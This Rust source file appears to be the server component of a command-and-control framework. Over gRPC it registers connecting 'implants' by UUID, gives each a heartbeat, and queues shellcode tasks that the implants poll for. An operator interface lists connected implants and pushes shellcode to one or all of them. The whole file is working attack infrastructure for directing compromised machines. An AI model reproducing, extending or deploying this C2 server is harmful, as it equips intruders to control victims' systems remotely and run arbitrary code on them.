use std::{collections::HashMap, sync::Arc};

use tokio::sync::RwLock;
use tonic::{Request, Response, Status};
use uuid::Uuid;

use crate::implant::Implant;
use crate::Task;

use crate::iface::{
    self, interface_service_server::InterfaceService, AddTaskRequest, AddTaskResponse,
    ClientListRequest, ClientListResponse,
};
use crate::tasks::{
    beacon_service_server::BeaconService, ConnectionRequest, ConnectionResponse, PollRequest,
    PollResponse,
};

const HEARTBEAT: u32 = 5000; // TODO: variable heartbeat config for implant

#[derive(Debug, Default)]
pub struct Beacon {
    implants: RwLock<HashMap<Uuid, Implant>>,
}
impl Beacon {
    pub fn new() -> Arc<Self> {
        Arc::new(Self::default())
    }

    pub async fn add_task(&self, task: Task) {
        let map = self.implants.read().await;

        for (_, val) in map.iter() {
            val.push_task(task.clone()).await;
        }
    }
}

#[tonic::async_trait]
impl BeaconService for Arc<Beacon> {
    async fn connection(
        &self,
        _request: Request<ConnectionRequest>,
    ) -> Result<Response<ConnectionResponse>, Status> {
        let id = Uuid::new_v4();

        println!("Got a connection request: {id}");

        let mut map = self.implants.write().await;
        map.insert(id, Implant::default());

        Ok(Response::new(ConnectionResponse {
            uuid: id.to_string(),
            heartbeat: HEARTBEAT,
        }))
    }

    // type PollStream = Pin<Box<dyn Stream<Item = Result<PollResponse, Status>> + Send + 'static>>;

    async fn poll(&self, request: Request<PollRequest>) -> Result<Response<PollResponse>, Status> {
        let id = Uuid::parse_str(&request.into_inner().uuid);
        if id.is_err() {
            return Err(Status::invalid_argument("Failed to parse uuid."));
        }

        let map = self.implants.read().await;
        Ok(Response::new(PollResponse {
            shellcode: match map.get(&id.unwrap()) {
                Some(v) => v.pop_task().await,
                None => {
                    return Err(Status::not_found(
                        "Client doesn't exist or isn't connected.",
                    ))
                }
            },
        }))
    }
}

#[tonic::async_trait]
impl InterfaceService for Arc<Beacon> {
    async fn connection(
        &self,
        _request: Request<iface::ConnectionRequest>,
    ) -> Result<Response<iface::ConnectionResponse>, Status> {
        let id = Uuid::new_v4();

        println!("Got an interface connection request: {id}");

        // let mut map = self.implants.write().await;
        // map.insert(id, Implant::default());

        Ok(Response::new(iface::ConnectionResponse {
            uuid: id.to_string(),
        }))
    }

    async fn get_list(
        &self,
        request: Request<ClientListRequest>,
    ) -> Result<Response<ClientListResponse>, Status> {
        let id = Uuid::parse_str(&request.into_inner().uuid);
        if id.is_err() {
            return Err(Status::invalid_argument("Failed to parse uuid."));
        }

        let map = self.implants.read().await;
        Ok(Response::new(ClientListResponse {
            list: map.keys().map(|k| k.to_string()).collect(),
        }))
    }

    async fn add_task(
        &self,
        request: Request<AddTaskRequest>,
    ) -> Result<Response<AddTaskResponse>, Status> {
        let request = request.into_inner();
        let id = Uuid::parse_str(&request.uuid);
        if id.is_err() {
            return Err(Status::invalid_argument("Failed to parse uuid."));
        }

        if request.task.is_none() {
            return Err(Status::invalid_argument("ShellCode should not be None."));
        }

        let map = self.implants.read().await;
        match map.get(&id.unwrap()) {
            Some(v) => v.push_task(request.task.unwrap()).await,
            None => {
                return Err(Status::not_found(
                    "Client doesn't exist or isn't connected.",
                ))
            }
        }
        Ok(Response::new(AddTaskResponse { }))
    }
}
